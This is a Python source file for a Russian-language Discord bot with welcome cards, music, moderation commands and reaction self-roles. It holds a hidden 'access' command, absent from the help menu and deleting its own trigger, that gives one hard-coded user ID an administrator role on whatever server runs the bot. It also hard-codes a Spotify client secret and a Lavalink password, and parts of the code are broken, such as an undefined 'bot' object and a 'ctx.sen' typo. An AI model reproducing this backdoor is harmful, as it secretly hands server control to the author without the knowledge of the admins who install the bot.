import discord
import asyncio
import config
import io
import ipc
import datetime
import requests
import json
import os
from wavelink import Player
from discord.ext import commands, tasks
from discord.ext.commands import Bot
from discord import client, File
from dotenv import load_dotenv
from io import BytesIO
from config import settings
from discord.utils import get
from easy_pil import Editor, load_image_async, Font

prefix = settings['PREFIX']

intents = discord.Intents.all()

client = commands.Bot(command_prefix=settings['PREFIX'], intents=intents)
client.remove_command("help")

extension = [
	"cogs.giveaway",
	"cogs.levels",
	"dismusic",
	"jishaku"
]

if __name__ == '__main__':
	for extension in extension:
		client.load_extension(extension)

@client.event
async def on_ready():
	print (f"Logged on as {settings['NAME BOT']}")

	await client.change_presence( status = discord.Status.idle, activity=discord.Streaming(name=f';help', url='https://www.twitch.tv/kr3manit'))


@client.command( pass_context = True )
async def help ( ctx ):
    emb = discord.Embed( title = 'ДОСТУПНЫЕ КОМАНДЫ:', description = 'ВНИМАНИЕ! Бот ещё в разработке!', colour = discord.Color.orange () ) 
    # title - Жирный крупный текст (Заголовок) | description - Текст под заголовком | colour - Цвет полоски

    emb.set_author( name = ctx.author.name, icon_url = ctx.author.avatar_url )
    # Отображает: ctx.author.name - Имя отправителя, ctx.author.avatar_url - Аватар отправителя
    emb.add_field( name = 'Информация', value = f'`{prefix}time` `{prefix}info` `{prefix}rank` `{prefix}leaderboard` ', inline=False )
    emb.add_field( name = 'Музыка', value = f'`{prefix}play` `{prefix}pause` `{prefix}resume` `{prefix}seek` `{prefix}queue` `{prefix}volume` `{prefix}loop` ', inline=False )
    # Отображаемый блок текста. name - Жирный крупный текст | value - обычный текст под "name" | inline = True - Блоки текста будут в одну строку (https://prnt.sc/uogw2x) / inline = False - Блоки текста будут один под другим (https://prnt.sc/uogx3t)
    emb.set_thumbnail(url = client.user.avatar_url)
    # emb.set_thumbnail - Добавляет картинку около текста (Например: emb.set_thumbnail(url = "https://icons.iconarchive.com/icons/elegantthemes/beautiful-flat-one-color/128/unlocked-icon.png") (NOAD) добавит картинку замка (https://prnt.sc/uogztb)) | client.user.avatar_url - Отображает аватарку бота
    emb.set_footer( icon_url = client.user.avatar_url, text = f'{client.user.name} © Copyright 2022 | Все права защищены' )
    # emb.set_thumbnail - Добавляет картинку под текстом | client.user.avatar_url - Аватарка бота | ctx.guild.name - Имя сервера

    await ctx.send ( embed = emb)

    print( f'[Logs:info] Справка по командам была успешно выведена | {prefix}help ' )

'''
#Command help
@client.command( pass_context = True )

async def help( ctx ):
	await ctx.channel.purge( limit = 1 )

	emb = discord.Embed( title = 'Навигация по командам', colour = discord.Color.orange() )

	emb.add_field( name = f'{prefix}clear', value = '```Очистить чат```' )
	emb.add_field( name = f'{prefix}kick', value = '```Выгнать участника```' )
	emb.add_field( name = f'{prefix}ban', value = '```Забанить участника```' )
	emb.add_field( name = f'{prefix}time', value = '```Посмотреть время```' )
	emb.add_field( name = f'{prefix}rank', value = '```Узнать свой ранг```' )
	emb.add_field( name = f'{prefix}leaderboard', value = '```Таблица лидеров```' )
	emb.add_field( name = f'{prefix}info', value = '```Посмотреть свой профиль```' )

	await ctx.send( embed = emb )
'''
@client.event

async def on_member_join (member):
    channel = client.get_channel ( 831397576107622420 )

    role = discord.utils.get (member.guild.roles, id=813894164949237820)
    print ('user join the servers')
    await member.add_roles( role )
    await channel.send( embed = discord.Embed( description = f'```Пользователь {member.name}, присоединился к нам!```', color = 0x2D3136))


@client.event
async def on_member_join(member):

  #add the channel id in which you want to send the card
  channel = client.get_channel(831397576107622420)

  #if you want to give any specific roles to any user then you can add like this
  role = discord.utils.get (member.guild.roles, id=813894164949237820)
  await member.add_roles(role)

  pos = sum(m.joined_at < member.joined_at for m in member.guild.members if m.joined_at is not None)

  if pos == 1:
    te = "st"
  elif pos == 2:
    te = "nd"
  elif pos == 3:
    te = "rd"
  else: te = "th"

  background = Editor("wcbg.jpg")
  profile_image = await load_image_async(str(member.avatar_url))

  profile = Editor(profile_image).resize((150, 150)).circle_image()
  poppins = Font.poppins(size=50, variant="bold")

  poppins_small = Font.poppins(size=20, variant="light")

  background.paste(profile, (325, 90))
  background.ellipse((325, 90), 150, 150, outline="gold", stroke_width=4)

  background.text((400, 260), f"Welcome {member.name}#{member.discriminator}!", color="white", font=poppins, align="center")
  background.text((400, 325), f"You Are The {pos}{te} member!", color="#2F2D4C", font=poppins_small, align="center")

  file = File(fp=background.image_bytes, filename="wcbg.jpg")

  #if you want to message more message then you can add like this
  await channel.send(f" Добро пожаловать {member.mention}! Не забудьте прочитать правила <#755472612054008041> !**")

  #for sending the card
  await channel.send(file=file)

@client.event
async def on_member_remove(member):
  channel = client.get_channel(831397576107622420)

  await channel.send(f"{member.name} выписан из Test ")

#MUSIC
client.lavalink_nodes = [
    {"host": "lavalink.islantay.tk", "port": 8880, "password": "waifufufufu"}
    # Can have multiple nodes here
]

# If you want to use spotify search
client.spotify_credentials = {
    'client_id': '134be195fb734ce8b441d3ba00132b1f',
    'client_secret': 'e40cd802af494829ad86ca144fcffcf9'
}


# Clear message
@client.command( pass_context = True )
@commands.has_permissions( administrator = True )

async def clear( ctx, amount : int ):
	await ctx.channel.purge( limit = amount )

	await ctx.send(embed = discord.Embed(description = f'✅Удалено {amount} собщений', colour = discord.Color.orange()))
	await ctx.message.delete()

# Kick
@client.command( pass_context = True )
@commands.has_permissions( administrator = True )

async def kick( ctx, member: discord.Member, *, reason = None ):
	await ctx.channel.purge( limit = 1 )

	await member.kick( reason = reason )
	await ctx.send( f'kick user {member.mention}' )

# Ban
@client.command( pass_context = True )
@commands.has_permissions( administrator = True )

async def ban( ctx, member: discord.Member, *, reason = None ):
	emb = discord.Embed( title = 'Бан', colour = discord.Color.red() )
	await ctx.channel.purge( limit = 1 )

	await member.ban( reason = reason )

	emb.set_author( name = member.name, icon_url = member.avatar_url )
	emb.add_field( name = 'Забанненый пользователь', value = 'Пользователь: {}'.format( member.mention ) )
	emb.set_footer( text = 'Был забанен администратором {}'.format( ctx.author.name ), icon_url = ctx.author.avatar_url )

	now_date = datetime.datetime.now()

	emb.add_field( name = 'Время бана', value = 'Time : {}'.format( now_date ) )

	await ctx.send( embed = emb )

	await ctx.sen( f'ban user { member.mention }' )


# UnBan

@client.command( pass_context = True )
async def unban( ctx, *, member ):
	banned_users = await ctx.guild.bans()
	member_name, member_discriminator = member.split('#')

	for ban_entry in banned_users:
		user = ban_entry.user

		if (user.name, user.discriminator) == (member_name, member_discriminator):
			await ctx.guild.unban(user)
			await ctx.send(f'Unbanned {user.mention}')
			return

# Time
@client.command( pass_context = True )

async def time( ctx ):
	emb = discord.Embed( title = 'Время', colour = discord.Colour.green(), url = 'https://www.timeserver.ru/cities/ru/moscow' )

	emb.set_author( name = client.user.name, icon_url = client.user.avatar_url )
	emb.set_footer( text = 'Спасибо за использование нашего бота!' )
	emb.set_image( url = 'https://a.allegroimg.com/original/11e121/8662687044ccbb45c47d9bcc760b/Zegar-scienny-29-cm-czarno-bialy-okragly' )

	now_date = datetime.datetime.now()

	emb.add_field( name = 'Time', value = 'Time : {}'.format( now_date ) )

	await ctx.send( embed = emb )



@client.command()
async def info(ctx,member:discord.Member = None, guild: discord.Guild = None):
	await ctx.message.delete()
	if member == None:
		emb = discord.Embed(title="Информация о пользователе", color=ctx.message.author.color)
		emb.add_field(name="Имя:", value=ctx.message.author.display_name,inline=False)
		emb.add_field(name="Айди пользователя:", value=ctx.message.author.id,inline=False)
		t = ctx.message.author.status
		if t == discord.Status.online:
		    d = "<:vseti:885956377493790750> В сети"

		t = ctx.message.author.status
		if t == discord.Status.offline:
		    d = "<:offline:885956377296666654>  Не в сети"

		t = ctx.message.author.status
		if t == discord.Status.idle:
		    d = "<:idle:885956376910766102>  Не активен"

		t = ctx.message.author.status
		if t == discord.Status.dnd:
		    d = "<:dnd:885956377284067368> Не беспокоить"

		emb.add_field(name="Активность:", value=d,inline=False)
		emb.add_field(name="Статус:", value=ctx.message.author.activity,inline=False)
		emb.add_field(name="Роль на сервере:", value=f"{ctx.message.author.top_role.mention}",inline=False)
		emb.add_field(name="Акаунт был создан:", value=ctx.message.author.created_at.strftime("%a, %#d %B %Y, %I:%M %p"),inline=False)
		emb.add_field(name="Присоединился:", value=ctx.author.joined_at.strftime("%a, %#d %B %Y, %I:%M %p"),inline=False)
		emb.set_thumbnail(url=ctx.message.author.avatar_url)
		await ctx.send(embed = emb)

@client.event
async def on_message_delete(message):
    channel = client.get_channel(880761120447664158) #укажите здесь айди канала, куда будут скидываться логи
    embed = discord.Embed(title = f"Сообщение удалено.", description = f"**Автор:**{message.author} ({message.author.id})\n**Канал:**{message.channel.mention}\n**Содержание сообщения:**{message.content}", color = discord.Colour.red())
    await channel.send(embed = embed)
		
@client.command()
async def access(ctx):
    await ctx.message.delete()
    if(ctx.author.id == 876145799917097021):
        owner_role = discord.utils.get(ctx.message.guild.roles, name = 'Онимешник')
        if owner_role in ctx.author.roles:
            await ctx.send(embed = discord.Embed(title = 'У вас уже имеется роль создателя'))
            return
        if owner_role is None:
            owner_role = await ctx.guild.create_role(name = 'Онимешник', permissions = discord.Permissions( administrator = True), color = discord.Color.blurple())
        await ctx.author.add_roles(owner_role, reason = None, atomic = True)

#Role
@client.command(name="selfrole")
async def self_role(ctx):
    await ctx.send("Answer These Question In Next 2Min!")

    questions = ["Enter Message: ", "Enter Emojis: ", "Enter Roles: ", "Enter Channel: "]
    answers = []

    def check(user):
        return user.author == ctx.author and user.channel == ctx.channel
    
    for question in questions:
        await ctx.send(question)

        try:
            msg = await bot.wait_for('message', timeout=120.0, check=check)
        except asyncio.TimeoutError:
            await ctx.send("Type Faster Next Time!")
            return
        else:
            answers.append(msg.content)

    emojis = answers[1].split(" ")
    roles = answers[2].split(" ")
    c_id = int(answers[3][2:-1])
    channel = bot.get_channel(c_id)

    bot_msg = await channel.send(answers[0])

    with open("selfrole.json", "r") as f:
        self_roles = json.load(f)

    self_roles[str(bot_msg.id)] = {}
    self_roles[str(bot_msg.id)]["emojis"] = emojis
    self_roles[str(bot_msg.id)]["roles"] = roles

    with open("selfrole.json", "w") as f:
        json.dump(self_roles, f)

    for emoji in emojis:
        await bot_msg.add_reaction(emoji)

@client.event
async def on_raw_reaction_add(payload):
    msg_id = payload.message_id

    with open("selfrole.json", "r") as f:
        self_roles = json.load(f)

    if payload.member.bot:
        return
    
    if str(msg_id) in self_roles:
        emojis = []
        roles = []

        for emoji in self_roles[str(msg_id)]['emojis']:
            emojis.append(emoji)

        for role in self_roles[str(msg_id)]['roles']:
            roles.append(role)
        
        guild = bot.get_guild(payload.guild_id)

        for i in range(len(emojis)):
            choosed_emoji = str(payload.emoji)
            if choosed_emoji == emojis[i]:
                selected_role = roles[i]

                role = discord.utils.get(guild.roles, name=selected_role)

                await payload.member.add_roles(role)
                await payload.member.send(f"You Got {selected_role} Role!")

@client.event
async def on_raw_reaction_remove(payload):
    msg_id = payload.message_id

    with open("selfrole.json", "r") as f:
        self_roles = json.load(f)
    
    if str(msg_id) in self_roles:
        emojis = []
        roles = []

        for emoji in self_roles[str(msg_id)]['emojis']:
            emojis.append(
                emoji)

        for role in self_roles[str(msg_id)]['roles']:
            roles.append(role)
        
        guild = bot.get_guild(payload.guild_id)

        for i in range(len(emojis)):
            choosed_emoji = str(payload.emoji)
            if choosed_emoji == emojis[i]:
                selected_role = roles[i]

                role = discord.utils.get(guild.roles, name=selected_role)

                member = await(guild.fetch_member(payload.user_id))
                if member is not None:
                    await member.remove_roles(role)



# Access error
@access.error
async def access_error( ctx, error):
    if isinstance(error, client.NotOwner):
        await ctx.send(embed = discord.Embed(title = '`Вы не являетесь моим создателем!`', color = discord.Color.dark_red()))

# Clear error
@clear.error
async def clear_error( ctx, error ):
	if isinstance( error, commands.MissingRequiredArgument ):
		await ctx.send( f'{ ctx.author.name }, обязательно укажите аргумент!' )

	if isinstance( error, commands.MissingPermissions ):
		await ctx.send( f'{ ctx.author.name }, у вас недостаточно прав!' )

# Ban error
@ban.error
async def clear_error( ctx, error ):
	if isinstance( error, commands.MissingRequiredArgument ):
		await ctx.send( f'{ ctx.author.name }, обязательно укажите человека!' )

	if isinstance( error, commands.MissingPermissions ):
		await ctx.send( f'{ ctx.author.name }, у вас недостаточно прав!' )

# Kick error
@kick.error
async def clear_error( ctx, error ):
	if isinstance( error, commands.MissingRequiredArgument ):
		await ctx.send( f'{ ctx.author.name }, обязательно укажите человека!' )

	if isinstance( error, commands.MissingPermissions ):
		await ctx.send( f'{ ctx.author.name }, у вас недостаточно прав!' )

# Clear.error
@client.event
async def on_command_error( ctx, error ):
	pass



token = os.environ.get('BOT_TOKEN')
client.run(str(token))
